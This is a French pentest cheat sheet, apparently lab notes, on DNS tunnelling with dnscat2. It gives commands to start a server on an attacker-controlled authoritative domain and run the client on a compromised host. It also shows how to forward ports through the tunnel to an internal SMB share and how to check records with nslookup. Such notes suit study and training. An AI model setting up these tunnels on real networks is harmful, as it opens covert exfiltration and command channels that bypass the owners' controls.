# DNS Tunneling

Exfiltre des données via des requêtes DNS (sous-domaines) et infiltre via des enregistrements TXT/CNAME/MX. Fonctionne même quand la machine compromise n'a aucune connectivité sortante directe -  les requêtes DNS passent par le resolver interne, qui les transmet à notre serveur autoritaire externe.

> Pas discret : génère un volume massif de requêtes DNS. Lent par nature (UDP, TTL, relais).

# Principe

```
Machine interne → DNS resolver interne (MULTISERVER03) → Serveur autoritaire (FELINEAUTHORITY/Kali)
```

La machine interne n'a pas besoin de joindre Kali directement. Il suffit qu'elle puisse résoudre des noms DNS et que notre machine soit le serveur autoritaire du domaine utilisé (ex: `feline.corp`).

# dnscat2

## Démarrer le serveur (sur la machine autoritaire)

```bash
dnscat2-server feline.corp
```

Le serveur écoute sur `0.0.0.0:53/UDP`. Il affiche une commande client et une **chaîne d'authentification** à vérifier côté client.

## Démarrer le client (sur la machine compromise)

```bash
./dnscat feline.corp
```

> Le binaire peut être transféré via SCP à travers un tunnel SSH existant.

Vérifier que la chaîne affichée par le client correspond à celle du serveur (détection de tampering).

## Interagir avec la session

```bash
# Lister les sessions
dnscat2> windows

# Entrer dans la session
dnscat2> window -i 1

# Lister les commandes disponibles
command (pgdatabase01) 1> ?
```

## Port forwarding via le tunnel DNS

`listen` fonctionne comme `ssh -L` : ouvre un port local sur le serveur dnscat2 et forward vers un socket accessible par le client.

```bash
command (pgdatabase01) 1> listen 127.0.0.1:<PORT_LOCAL> <IP_CIBLE>:<PORT_CIBLE>
```

```bash
# Exemple : accéder au SMB de HRSHARES depuis FELINEAUTHORITY
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
```

```bash
# Utiliser le tunnel depuis FELINEAUTHORITY
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=<password>
```

# Rappel DNS utile

| Type    | Usage dans le tunnel         |
|---------|------------------------------|
| A       | Exfiltration (sous-domaine)  |
| TXT     | Infiltration (données arbitraires) |
| CNAME   | Transport dnscat2            |
| MX      | Transport dnscat2            |

```bash
# Tester qu'un enregistrement TXT arrive bien depuis l'interne
nslookup -type=txt www.feline.corp
# Forcer le resolver (contourner le cache systemd-resolved)
nslookup www.feline.corp <IP_DNS_RESOLVER>
# Vider le cache DNS local
resolvectl flush-caches
```

![](img/Pasted%20image%2020260509215800.png)